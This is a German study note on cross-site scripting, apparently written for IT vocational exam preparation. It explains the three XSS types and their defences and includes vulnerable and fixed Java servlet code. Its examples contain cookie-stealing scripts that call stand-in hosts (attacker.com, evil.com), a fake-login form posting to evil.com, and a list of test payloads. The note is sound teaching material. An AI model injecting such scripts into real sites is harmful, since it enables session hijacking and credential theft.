---
{"dg-publish":true,"permalink":"/02-resources/notes/cross-site-scripting/","tags":["sicherheit/it-sicherheit","sicherheit/web-sicherheit","ausbildung/gfn/ap1/vorbereitung"],"noteIcon":"","updated":"2025-11-06T12:02:11.720+01:00"}
---

>**Cross-Site Scripting (XSS)** ist eine Sicherheitslücke in Webanwendungen, bei der ein Angreifer schädlichen Code (meist JavaScript) in eine Website einschleust, der dann im Browser anderer Benutzer ausgeführt wird.
>>Der eingeschleuste Code läuft mit den Rechten des betroffenen Benutzers und kann dadurch Sitzungsdaten (Cookies, Session-Tokens) stehlen, Inhalte manipulieren oder weitere Angriffe durchführen.

>[!danger] Kritische Gefahr
>XSS gehört zu den **OWASP Top 10** Web-Sicherheitsrisiken und ist eine der häufigsten Schwachstellen in Webanwendungen!

---

# Wie funktioniert XSS?

>Ein Angreifer nutzt eine Eingabemöglichkeit (z.B. Suchfeld, Kommentarfeld, URL-Parameter), um schädlichen JavaScript-Code einzuschleusen. Wenn die Webanwendung diese Eingabe **nicht validiert oder escaped**, wird der Code im Browser des Opfers ausgeführt.

**Grundprinzip:**
```
1. Angreifer schleust Code ein → 2. Server speichert/zeigt Code → 3. Opfer lädt Seite → 4. Schadcode wird ausgeführt
```

---

# Die 3 Arten von XSS

## 1. Reflected XSS (Reflektiertes XSS)
>Der schädliche Code wird **direkt** vom Server an den Benutzer zurückgegeben, ohne gespeichert zu werden.

**Beispiel**: Suchfunktion
```html
<!-- Angreifer sendet diese URL: -->
https://example.com/search?q=<script>alert('XSS')</script>

<!-- Server gibt ungeprüft zurück: -->
<p>Suchergebnis für: <script>alert('XSS')</script></p>
```

>[!warning] Angriffsvector
>Der Angreifer muss das Opfer dazu bringen, einen **manipulierten Link** anzuklicken (z.B. per Phishing-E-Mail).

**Realistisches Beispiel** (Cookie-Diebstahl):
```javascript
https://example.com/search?q=<script>
  document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
```

## 2. Stored XSS (Persistentes XSS)
>Der schädliche Code wird **dauerhaft** auf dem Server gespeichert (z.B. in einer Datenbank) und bei jedem Aufruf der Seite ausgeführt.

**Beispiel**: Kommentarfunktion
```html
<!-- Angreifer postet Kommentar: -->
<script>
  fetch('http://attacker.com/log?cookie=' + document.cookie)
</script>

<!-- Jeder Nutzer, der die Kommentare lädt, wird angegriffen! -->
```

>[!danger] Besonders gefährlich
>Stored XSS ist am gefährlichsten, da **alle Benutzer** betroffen sind, die die infizierte Seite besuchen - nicht nur die, die auf einen Link klicken!

**Betroffene Bereiche:**
- Kommentarfelder
- Forenbeiträge
- Nutzerprofile (Bio, Name, etc.)
- Chat-Nachrichten
- Gästebücher

## 3. DOM-based XSS
>Der Angriff findet **komplett im Browser** statt, ohne dass der Server involviert ist. Der schädliche Code manipuliert das **Document Object Model (DOM)** direkt.

**Beispiel**:
```html
<!-- Verwundbarer JavaScript-Code: -->
<script>
  let name = window.location.hash.substring(1);
  document.getElementById('welcome').innerHTML = 'Willkommen ' + name;
</script>

<!-- Angreifer sendet URL: -->
https://example.com/#<img src=x onerror="alert('XSS')">
```

>[!info] Besonderheit
>Der Server "sieht" den Angriff nicht, da alles clientseitig im Browser passiert.

---

# Visualisierung: XSS-Angriff

```
┌─────────────┐                    ┌─────────────┐
│  Angreifer  │                    │   Website   │
└─────────────┘                    └─────────────┘
       │                                  │
       │  1. POST /comment               │
       │     "<script>...</script>"      │
       │─────────────────────────────────►│
       │                                  │
       │  2. Gespeichert in DB           │
       │                                  ┃
       │                                  │
┌─────────────┐                          │
│    Opfer    │                          │
└─────────────┘                          │
       │                                  │
       │  3. GET /comments               │
       │─────────────────────────────────►│
       │                                  │
       │  4. HTML mit <script>...</script>│
       │◄─────────────────────────────────│
       │                                  │
       │  5. Browser führt Script aus!   │
       │     → Cookie wird gestohlen     │
       │                                  │
```

---

# Was kann ein Angreifer mit XSS machen?

>[!danger] Mögliche Schäden
>- **Session Hijacking**: Cookies und Session-Tokens stehlen
>- **Phishing**: Fake-Login-Formulare einblenden
>- **Keylogging**: Tastatureingaben aufzeichnen
>- **Inhalte manipulieren**: Seiteninhalt verändern
>- **Malware verbreiten**: Downloads starten
>- **Account-Übernahme**: Aktionen im Namen des Opfers ausführen

**Beispiel - Cookie-Diebstahl:**
```javascript
<script>
  // Cookie an Angreifer-Server senden
  let cookie = document.cookie;
  fetch('https://evil.com/steal?data=' + cookie);
</script>
```

**Beispiel - Fake-Login:**
```javascript
<script>
  document.body.innerHTML = `
    <h1>Sitzung abgelaufen</h1>
    <form action="https://evil.com/phish" method="POST">
      <input name="user" placeholder="Benutzername">
      <input name="pass" type="password" placeholder="Passwort">
      <button>Anmelden</button>
    </form>
  `;
</script>
```

---

# Schutzmaßnahmen gegen XSS

## 1. Input Validation (Eingabevalidierung)
>Alle Benutzereingaben müssen **validiert** werden.

```java
// Nur erlaubte Zeichen akzeptieren
public boolean isValidUsername(String input) {
    return input.matches("^[a-zA-Z0-9_]{3,20}$");
}
```

>[!tip] Whitelist statt Blacklist
>Erlauben Sie nur **bekannt sichere** Zeichen, statt zu versuchen, alle gefährlichen zu blockieren.

## 2. Output Encoding (Ausgabekodierung)
>**Wichtigste Maßnahme**: Alle Ausgaben müssen **escaped** (kodiert) werden!

**HTML Escaping:**
```java
// Gefährlich:
out.println("<p>Hallo " + username + "</p>");

// Sicher (HTML-escaped):
out.println("<p>Hallo " + escapeHtml(username) + "</p>");
```

**Was wird escaped:**
| Zeichen | Escaped zu |
|---------|-----------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

**Beispiel:**
```
Input:  <script>alert('XSS')</script>
Output: &lt;script&gt;alert('XSS')&lt;/script&gt;
```

## 3. Content Security Policy (CSP)
>Ein **HTTP-Header**, der dem Browser mitteilt, welche Ressourcen er laden darf.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

>[!info] Wirkung
>- Blockiert Inline-JavaScript (`<script>...</script>`)
>- Erlaubt nur Scripts von vertrauenswürdigen Quellen
>- Verhindert `eval()` und `setTimeout()` mit Strings

## 4. HTTPOnly & Secure Cookies
>Cookies mit `HTTPOnly`-Flag können **nicht** von JavaScript gelesen werden.

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

| Flag | Bedeutung |
|------|-----------|
| `HttpOnly` | JavaScript kann nicht auf Cookie zugreifen |
| `Secure` | Cookie nur über HTTPS |
| `SameSite` | Schutz vor CSRF-Angriffen |

## 5. Framework-Sicherheitsfunktionen nutzen
>Moderne Frameworks haben **automatisches Escaping**:

**React:**
```javascript
// Automatisch sicher:
<div>{userInput}</div>

// Gefährlich (explizit unsicher):
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

**Angular:**
```html
<!-- Automatisch escaped: -->
<p>{{ username }}</p>

<!-- Unsicher: -->
<p [innerHTML]="username"></p>
```

---

# Code-Beispiel: Verwundbare vs. Sichere Implementierung

## ❌ Verwundbar
```java
@WebServlet("/search")
public class SearchServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request,
                         HttpServletResponse response) {
        String query = request.getParameter("q");

        // GEFÄHRLICH: Direkte Ausgabe ohne Escaping
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<h1>Suchergebnis für: " + query + "</h1>");
    }
}
```

## ✅ Sicher
```java
@WebServlet("/search")
public class SearchServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request,
                         HttpServletResponse response) {
        String query = request.getParameter("q");

        // SICHER: Mit HTML-Escaping
        String safeQuery = StringEscapeUtils.escapeHtml4(query);

        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<h1>Suchergebnis für: " + safeQuery + "</h1>");
    }
}
```

---

# Testing auf XSS

## Manuelle Tests

**Einfache Test-Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
```

**Erweiterte Payloads:**
```html
<iframe src="javascript:alert('XSS')">
<input autofocus onfocus=alert('XSS')>
<select onfocus=alert('XSS') autofocus>
<textarea autofocus onfocus=alert('XSS')>
<body onload=alert('XSS')>
```

## Automatisierte Tools
- **OWASP ZAP** (Zed Attack Proxy)
- **Burp Suite**
- **XSStrike**
- **Browser-Extensions** für Penetration Testing

---

# Zusammenfassung

>[!summary] Kernpunkte
>- **XSS** = Einschleusen von schädlichem Code in Webseiten
>- **3 Typen**: Reflected, Stored (am gefährlichsten), DOM-based
>- **Ziel**: Cookie-Diebstahl, Phishing, Malware, Account-Übernahme
>- **Schutz**: Input Validation, **Output Encoding** (wichtigste!), CSP, HTTPOnly-Cookies
>- Teil der **OWASP Top 10** Sicherheitsrisiken

>[!important] Goldene Regel
>**Traue niemals Benutzereingaben!** Alle Eingaben validieren, alle Ausgaben escapen.

---

# Verwandte Konzepte

- [[SQL-Injection\|SQL-Injection]] - Ähnlicher Angriff auf Datenbanken
- [[CSRF\|CSRF]] - Cross-Site Request Forgery
- [[02 - RESOURCES/Notes/MitM-Angriff\|MitM-Angriff]] - Man-in-the-Middle Angriffe
- [[OWASP Top 10\|OWASP Top 10]] - Die 10 kritischsten Web-Sicherheitsrisiken

---

# Weiterführende Ressourcen

🎥 **Video-Tutorial**: [Link in Frontmatter](https://www.youtube.com/watch?v=txHc4zk6w3s)

📚 **Dokumentation**:
- OWASP XSS Prevention Cheat Sheet
- MDN Web Docs: Content Security Policy
- PortSwigger Web Security Academy: XSS
